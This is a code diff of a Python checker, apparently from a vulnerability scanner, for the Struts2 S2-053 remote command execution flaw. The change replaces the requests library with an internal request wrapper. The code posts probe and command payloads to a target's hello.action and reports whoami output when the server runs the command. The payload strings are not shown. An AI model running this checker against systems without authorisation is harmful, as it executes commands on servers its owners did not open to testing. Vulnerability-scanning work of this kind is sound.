@@ -6,9 +6,8 @@ description: Struts2 S2-053漏洞可执行任意命令
 '''
 
 import re
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class S2_053_BaseVerify:
     def __init__(self, url):
@@ -37,17 +36,17 @@ class S2_053_BaseVerify:
         if  '.action' not in self.url:
             self.url = self.url + '/hello.action'
         try:
-            check_req = requests.post(self.url, headers = self.headers, data = self.check_payload)
+            check_req = request.post(self.url, headers = self.headers, data = self.check_payload)
             print()
             if check_req.status_code == 200:
                 if self.check_count(check_req.text, 'OS:Linux') == 2:
-                    cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_payload)
+                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
                     cmd_str = re.sub('\n', '', cmd_req.text)
                     result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
                     print('存在S2-053漏洞,OS为Linux,执行whoami命令成功，其结果为:', result)
                     return True
                 if self.check_count(check_req.text, 'OS:Windows') == 2:
-                    cmd_req = requests.post(self.url, headers = self.headers, data = self.cmd_payload)
+                    cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_payload)
                     cmd_str = re.sub('\n', '', cmd_req.text)
                     result = re.findall('<p>Your url:(.*?)</p>', cmd_str)
                     print('存在S2-053漏洞,OS为Windows,执行whoami命令成功，其结果为:', result)
